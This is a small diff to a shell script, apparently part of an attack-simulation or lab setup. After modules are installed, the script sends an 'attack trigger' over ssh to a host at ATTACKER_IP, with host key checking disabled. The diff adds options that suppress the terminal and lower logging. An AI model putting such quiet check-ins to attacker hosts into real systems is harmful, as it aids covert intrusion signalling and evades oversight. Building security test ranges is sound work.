@@ -94,11 +94,13 @@ run_actions() {
   echo "All modules installed. Sending attack trigger to attacker: ${ATTACKER_IP}"
 
   ssh \
+    -T \
     -i "${TRIGGER_PRIVATE_KEY}" \
     -o BatchMode=yes \
     -o IdentitiesOnly=yes \
     -o StrictHostKeyChecking=no \
     -o UserKnownHostsFile=/dev/null \
+    -o LogLevel=ERROR \
     -o ConnectTimeout=10 \
     "${TRIGGER_USER}@${ATTACKER_IP}"
 
